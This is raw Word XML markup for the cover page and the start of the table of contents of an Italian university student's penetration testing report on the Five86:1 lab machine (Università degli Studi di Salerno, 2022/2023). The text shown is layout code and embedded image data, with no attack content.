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ACAD2" w14:textId="77777777" w:rsidR="00D5413C" w:rsidRPr="00AE4289" w:rsidRDefault="000C6762">
      <w:pPr>
        <w:pStyle w:val="Foto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Hlk139398067"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4D84FE44" wp14:editId="021B62C1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>279128</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4610991" cy="4610991"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="16" name="Picture 4" descr="Risultati immagini per logo unisa">
              <a:extLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B78403E-184D-43A6-84E9-CB7C0FFB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Risultati immagini per logo unisa">
                      <a:extLst>
                        <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                          <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B78403E-184D-43A6-84E9-CB7C0FFB3B0F}"/>
                        </a:ext>
                      </a:extLst>
                    </pic:cNvPr>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8">
                      <a:duotone>
                        <a:schemeClr val="accent1">
                          <a:shade val="45000"/>
                          <a:satMod val="135000"/>
                        </a:schemeClr>
                        <a:prstClr val="white"/>
                      </a:duotone>
                      <a:alphaModFix amt="10000"/>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4610991" cy="4610991"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00CE488A" w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251660288" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6FA836BD" wp14:editId="2348EC72">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>215435</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>-635969</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3221588" cy="369332"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapNone/>
                <wp:docPr id="25" name="CasellaDiTesto 24">
                  <a:extLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5FB8ECF8-2AE1-41A8-B1B0-457AEFA82AC2}"/>
                    </a:ext>
                  </a:extLst>
                </wp:docPr>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="3221588" cy="369332"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="13BD8A86" w14:textId="77777777" w:rsidR="00FC391B" w:rsidRPr="00EC00E7" w:rsidRDefault="00FC391B" w:rsidP="00FC391B">
                            <w:pPr>
                              <w:jc w:val="center"/>
                              <w:rPr>
                                <w:rFonts w:cs="Times New Roman"/>
                                <w:sz w:val="44"/>
                                <w:szCs w:val="44"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00EC00E7">
                              <w:rPr>
                                <w:rFonts w:cs="Times New Roman"/>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="C3857F"/>
                                <w:kern w:val="24"/>
                                <w:sz w:val="56"/>
                                <w:szCs w:val="56"/>
                              </w:rPr>
                              <w:t>Università degli Studi di Salerno</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr wrap="none" rtlCol="0">
                        <a:spAutoFit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shapetype w14:anchorId="6FA836BD" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                <v:stroke joinstyle="miter"/>
                <v:path gradientshapeok="t" o:connecttype="rect"/>
              </v:shapetype>
              <v:shape id="CasellaDiTesto 24" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:16.95pt;margin-top:-50.1pt;width:253.65pt;height:29.1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WyegEAAOcCAAAOAAAAZHJzL2Uyb0RvYy54bWysUsFOAjEQvZv4D03vsrBEghsWohK8GDVB&#10;P6B0W3aTbafpFHb5e6cFwejNeJm2M53XN+91tuhNy/bKYwO25KPBkDNlJVSN3Zb84311M+UMg7CV&#10;aMGqkh8U8sX8+mrWuULlUENbKc8IxGLRuZLXIbgiy1DWyggcgFOWihq8EYGOfptVXnSEbtosHw4n&#10;WQe+ch6kQqTs8ljk84SvtZLhVWtUgbUlJ24hRZ/iJsZsPhPF1gtXN/JEQ/yBhRGNpUfPUEsRBNv5&#10;5heUaaQHBB0GEkwGWjdSpRlomtHwxzTrWjiVZiFx0J1lwv+DlS/7tXvzLPQP0JOBUZDOYYGUjPP0&#10;2pu4ElNGdZLwcJZN9YFJSo7zfHQ7JaMl1caTu/E4jzDZpdt5DE8KDIubknuyJakl9s8Yjle/rsTH&#10;LKyato35C5W4C/2mP/HbQHUg2h05V3JLX4szH9pHSDZHDHT3u0A4CT42HztOmKRmInhyPtr1/Zxu&#10;Xf7n/BMAAP//AwBQSwMEFAAGAAgAAAAhAOFzlLzeAAAACwEAAA8AAABkcnMvZG93bnJldi54bWxM&#10;j01OwzAQRvdI3MEaJHatnTRFbRqnQgXW0MIB3GSI08TjKHbbwOkZVrCbn6dv3hTbyfXigmNoPWlI&#10;5goEUuXrlhoNH+8vsxWIEA3VpveEGr4wwLa8vSlMXvsr7fFyiI3gEAq50WBjHHIpQ2XRmTD3AxLv&#10;Pv3oTOR2bGQ9miuHu16mSj1IZ1riC9YMuLNYdYez07BS7rXr1ulbcNl3srS7J/88nLS+v5seNyAi&#10;TvEPhl99VoeSnY7+THUQvYbFYs2khlmiVAqCiWWWcHHkUZYqkGUh//9Q/gAAAP//AwBQSwECLQAU&#10;AAYACAAAACEAtoM4kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnht&#10;bFBLAQItABQABgAIAAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVs&#10;c1BLAQItABQABgAIAAAAIQD8VCWyegEAAOcCAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9j&#10;LnhtbFBLAQItABQABgAIAAAAIQDhc5S83gAAAAsBAAAPAAAAAAAAAAAAAAAAANQDAABkcnMvZG93&#10;bnJldi54bWxQSwUGAAAAAAQABADzAAAA3wQAAAAA&#10;" filled="f" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w14:paraId="13BD8A86" w14:textId="77777777" w:rsidR="00FC391B" w:rsidRPr="00EC00E7" w:rsidRDefault="00FC391B" w:rsidP="00FC391B">
                      <w:pPr>
                        <w:jc w:val="center"/>
                        <w:rPr>
                          <w:rFonts w:cs="Times New Roman"/>
                          <w:sz w:val="44"/>
                          <w:szCs w:val="44"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00EC00E7">
                        <w:rPr>
                          <w:rFonts w:cs="Times New Roman"/>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="C3857F"/>
                          <w:kern w:val="24"/>
                          <w:sz w:val="56"/>
                          <w:szCs w:val="56"/>
                        </w:rPr>
                        <w:t>Università degli Studi di Salerno</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="5703CC54" w14:textId="77777777" w:rsidR="001638F6" w:rsidRPr="00AE4289" w:rsidRDefault="00762ED1" w:rsidP="00D5413C">
      <w:pPr>
        <w:pStyle w:val="Titolo"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Penetration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> Testing Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C29DE3" w14:textId="5F2828D6" w:rsidR="005D6A9F" w:rsidRPr="00AE4289" w:rsidRDefault="00EC00E7" w:rsidP="005D6A9F">
      <w:pPr>
        <w:pStyle w:val="Sottotitolo"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Five86:1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102FF279" w14:textId="3ABE5E49" w:rsidR="003422FF" w:rsidRPr="00AE4289" w:rsidRDefault="005D6A9F" w:rsidP="005D6A9F">
      <w:pPr>
        <w:pStyle w:val="Informazionicontatto"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3FA39EAA" wp14:editId="030AC404">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-1143000</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>6514465</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="7727136" cy="433705"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapNone/>
                <wp:docPr id="4" name="Rettangolo 4"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="7727136" cy="43370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CE8BE05" id="Rettangolo 4" o:spid="_x0000_s1026" style="position:absolute;margin-left:-90pt;margin-top:512.95pt;width:608.45pt;height:3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a+oAIAAKkFAAAOAAAAZHJzL2Uyb0RvYy54bWysVMFu2zAMvQ/YPwi6r3bStNmCOkXQosOA&#10;ri3aDj0rshQbkERNUuJkXz9Kcty0C3YYdrFFkXwkn0heXG61IhvhfAumoqOTkhJhONStWVX0x/PN&#10;p8+U+MBMzRQYUdGd8PRy/vHDRWdnYgwNqFo4giDGzzpb0SYEOysKzxuhmT8BKwwqJTjNAopuVdSO&#10;dYiuVTEuy/OiA1dbB1x4j7fXWUnnCV9KwcO9lF4EoiqKuYX0dem7jN9ifsFmK8ds0/I+DfYPWWjW&#10;Ggw6QF2zwMjatX9A6ZY78CDDCQddgJQtF6kGrGZUvqvmqWFWpFqQHG8Hmvz/g+V3mwdH2rqiE0oM&#10;0/hEjyLgg61AAZlEfjrrZ2j2ZB9cL3k8xmK30un4xzLINnG6GzgV20A4Xk6n4+no9JwSjrrJ6em0&#10;PIugxau3dT58FaBJPFTU4ZslKtnm1odsujeJwTyotr5plUpC7BNxpRzZMHzh5WqUXNVaf4c6303P&#10;yjK9M4ZMbRXNUwJvkJSJeAYicg4ab4pYfC43ncJOiWinzKOQSBsWOE4RB+QclHEuTMjJ+IbVIl/H&#10;VI7nkgAjssT4A3YP8LbIPXbOsrePriL1++Bc/i2x7Dx4pMhgwuCsWwPuGIDCqvrI2X5PUqYmsrSE&#10;eodN5SBPm7f8psWnvWU+PDCH44WDiCsj3ONHKugqCv2Jkgbcr2P30R67HrWUdDiuFfU/18wJStQ3&#10;g/PwZTSZxPlOwuRsOkbBHWqWhxqz1leA/TLC5WR5Okb7oPZH6UC/4GZZxKioYoZj7Iry4PbCVchr&#10;BHcTF4tFMsOZtizcmifLI3hkNbbu8/aFOdv3d8DJuIP9aLPZuzbPttHTwGIdQLZpBl557fnGfZCa&#10;uN9dceEcysnqdcPOfwMAAP//AwBQSwMEFAAGAAgAAAAhABLfyCnhAAAADwEAAA8AAABkcnMvZG93&#10;bnJldi54bWxMj8FOwzAQRO9I/IO1SNxau4FWbohTFSTgwqUtB45uvMRR43WI3TT8Pc6p3GY1o9k3&#10;xWZ0LRuwD40nBYu5AIZUedNQreDz8DqTwELUZHTrCRX8YoBNeXtT6Nz4C+1w2MeapRIKuVZgY+xy&#10;zkNl0ekw9x1S8r5973RMZ19z0+tLKnctz4RYcacbSh+s7vDFYnXan52C8L78OlTyR57qt2c5WLvb&#10;8g+r1P3duH0CFnGM1zBM+AkdysR09GcygbUKZgsp0piYHJEt18CmjHhYJXWc1PoxA14W/P+O8g8A&#10;AP//AwBQSwECLQAUAAYACAAAACEAtoM4kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRl&#10;bnRfVHlwZXNdLnhtbFBLAQItABQABgAIAAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8B&#10;AABfcmVscy8ucmVsc1BLAQItABQABgAIAAAAIQCZQAa+oAIAAKkFAAAOAAAAAAAAAAAAAAAAAC4C&#10;AABkcnMvZTJvRG9jLnhtbFBLAQItABQABgAIAAAAIQAS38gp4QAAAA8BAAAPAAAAAAAAAAAAAAAA&#10;APoEAABkcnMvZG93bnJldi54bWxQSwUGAAAAAAQABADzAAAACAYAAAAA&#10;" fillcolor="#bfbfbf [2412]" stroked="f" strokeweight="2pt"/>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251663360" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4F0E8247" wp14:editId="7AA8B9CE">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-1155700</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>6491144</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="7683560" cy="0"/>
                <wp:effectExtent l="0" t="12700" r="25400" b="25400"/>
                <wp:wrapNone/>
                <wp:docPr id="14" name="Connettore diritto 13">
                  <a:extLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B0A73805-120B-4F0D-BF81-4B8CDC667B6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83560" cy="0"/>
                        </a:xfrm>
                        <a:prstGeom prst="line">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:ln w="38100">
                          <a:solidFill>
                            <a:srgbClr val="AD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275C0349" id="Connettore diritto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1pt,511.1pt" to="514pt,5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uxXgIAAAcFAAAOAAAAZHJzL2Uyb0RvYy54bWysVNuO0zAQfUfiH6y8p7k0m4ao6WrTNghp&#10;BRULH+A6Tmvh2JFtetFq/33HzoXlIgSIPrhje87MOTPjLG8vLUcnqjSTovCiWeghKoismTgU3udP&#10;lZ95SBssasyloIV3pdq7Xb1+tTx3OY3lUfKaKgRBhM7PXeEdjenyINDkSFusZ7KjAi4bqVpsYKsO&#10;Qa3wGaK3PIjDMA3OUtWdkoRqDaeb/tJbufhNQ4n50DSaGsQLD7gZtyq37u0arJY4PyjcHRkZaOB/&#10;YNFiJiDpFGqDDUZfFfspVMuIklo2ZkZkG8imYYQ6DaAmCn9Q83DEHXVaoDi6m8qk/19Y8v60U4jV&#10;0LvEQwK30KO1FIIaIxVFNVMMLBTNnTp6MffaWJ1g9foeqyoub7ZV4ldg+UlYJn65Td74VTzPtvGi&#10;Wsfz9MmiozQnimIDk/KuHmsdpX+mZei6rVISuGo70o9leLeYZ+GNH8Vh6SdVuPHLKov8pMzWm3Wa&#10;Lsq0fLJdDhzn8d+pCM6dzl0B7Lg4cy12ysojF/HQ3UvyRVvod5d2o7ve7dKo1rpDH9HFDdV1Gipb&#10;IQKHizSb36Qwe2S8AyojsFPavKWyRdYoPM6E7TfO8QkY9qxHF3vMBToX3jyLwtC5aclZXTHO7aVW&#10;h/2aK3TCMOt3mxB+g/AXbpCbi0FSr8LpMVdO+wQfaQOVBd5Rn8E+RDqFxYRQYaIhLhfgbWENUJiA&#10;A7XfAQd/C6Xukf4NeEK4zFKYCdwyIdWvaJvLSLnp/ccK9LptCfayvu7U2G14bW5Uhi+Dfc4v9w7+&#10;7fu1egYAAP//AwBQSwMEFAAGAAgAAAAhAKEfK6zgAAAADwEAAA8AAABkcnMvZG93bnJldi54bWxM&#10;j0FLw0AQhe+C/2EZwVu7m1UkpNkUMSiIaGnrweM2mSbB7GzIbtv4750eih7nvceb7+XLyfXiiGPo&#10;PBlI5goEUuXrjhoDn9vnWQoiREu17T2hgR8MsCyur3Kb1f5EazxuYiO4hEJmDbQxDpmUoWrR2TD3&#10;AxJ7ez86G/kcG1mP9sTlrpdaqQfpbEf8obUDPrVYfW8Ojlu2b8mHdK9fq/fyvnlZlW5d3jljbm+m&#10;xwWIiFP8C8MZn9GhYKadP1AdRG9glqSax0R2lNYaxDmjdMra7qLJIpf/dxS/AAAA//8DAFBLAQIt&#10;ABQABgAIAAAAIQC2gziS/gAAAOEBAAATAAAAAAAAAAAAAAAAAAAAAABbQ29udGVudF9UeXBlc10u&#10;eG1sUEsBAi0AFAAGAAgAAAAhADj9If/WAAAAlAEAAAsAAAAAAAAAAAAAAAAALwEAAF9yZWxzLy5y&#10;ZWxzUEsBAi0AFAAGAAgAAAAhAKYy27FeAgAABwUAAA4AAAAAAAAAAAAAAAAALgIAAGRycy9lMm9E&#10;b2MueG1sUEsBAi0AFAAGAAgAAAAhAKEfK6zgAAAADwEAAA8AAAAAAAAAAAAAAAAAuAQAAGRycy9k&#10;b3ducmV2LnhtbFBLBQYAAAAABAAEAPMAAADFBQAAAAA=&#10;" strokecolor="#ad0000" strokeweight="3pt">
                <o:lock v:ext="edit" shapetype="f"/>
              </v:line>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00EC00E7" w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Paolo Labanca</w:t>
      </w:r>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:bidi="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:rFonts w:cs="Times New Roman"/>
          </w:rPr>
          <w:alias w:val="Corso:"/>
          <w:tag w:val="Corso:"/>
          <w:id w:val="-1824112714"/>
          <w:placeholder>
            <w:docPart w:val="4573BCD9F82842B59CB64A476EFD06A0"/>
          </w:placeholder>
          <w:temporary/>
          <w:showingPlcHdr/>
          <w15:appearance w15:val="hidden"/>
        </w:sdtPr>
        <w:sdtContent>
          <w:r w:rsidRPr="00AE4289">
            <w:rPr>
              <w:rFonts w:cs="Times New Roman"/>
              <w:lang w:bidi="it-IT"/>
            </w:rPr>
            <w:t>Corso</w:t>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> di PTEH</w:t>
      </w:r>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="20"/>
          <w:lang w:eastAsia="it-IT"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="35ED06C7" wp14:editId="6129CC58">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="margin">
              <wp:align>bottom</wp:align>
            </wp:positionV>
            <wp:extent cx="5274310" cy="1035050"/>
            <wp:effectExtent l="0" t="0" r="0" b="635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a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="1035050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:bidi="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>A.A. 20</w:t>
      </w:r>
      <w:r w:rsidR="00AF78EB" w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>22</w:t>
      </w:r>
      <w:r w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>/202</w:t>
      </w:r>
      <w:r w:rsidR="00AF78EB" w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="003422FF" w:rsidRPr="00AE4289">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:lang w:bidi="it-IT"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="4D322D" w:themeColor="text2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:id w:val="-1781408473"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:noProof/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="1A75B9BE" w14:textId="77777777" w:rsidR="004A3D0B" w:rsidRPr="00550195" w:rsidRDefault="004A3D0B" w:rsidP="00844D78">
          <w:pPr>
            <w:pStyle w:val="Titolosommario"/>
            <w:rPr>
              <w:color w:val="auto"/>
              <w:lang w:val="it-IT"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00550195">
            <w:rPr>
              <w:color w:val="auto"/>
              <w:lang w:val="it-IT"/>
            </w:rPr>
            <w:t>Sommario</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="5E49A61F" w14:textId="2D5C5C1D" w:rsidR="003F27AD" w:rsidRDefault="004A3D0B">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:noProof/>
              <w:color w:val="auto"/>
              <w:kern w:val="2"/>
              <w:sz w:val="22"/>
              <w:u w:val="none"/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00AE4289">
            <w:rPr>
              <w:rFonts w:cs="Times New Roman"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidRPr="00AE4289">
            <w:rPr>
              <w:rFonts w:cs="Times New Roman"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
            <w:instrText>TOC \o "1-3" \h \z \u</w:instrText>
          </w:r>
          <w:r w:rsidRPr="00AE4289">
            <w:rPr>
              <w:rFonts w:cs="Times New Roman"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:sz w:val="28"/>
              <w:szCs w:val="28"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc139378594" w:history="1">
            <w:r w:rsidR="003F27AD" w:rsidRPr="00B5406A">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introduzione</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc139378594 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="003F27AD">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4A76EBAC" w14:textId="1B8873B9" w:rsidR="003F27AD" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8296"/>
            </w:tabs>
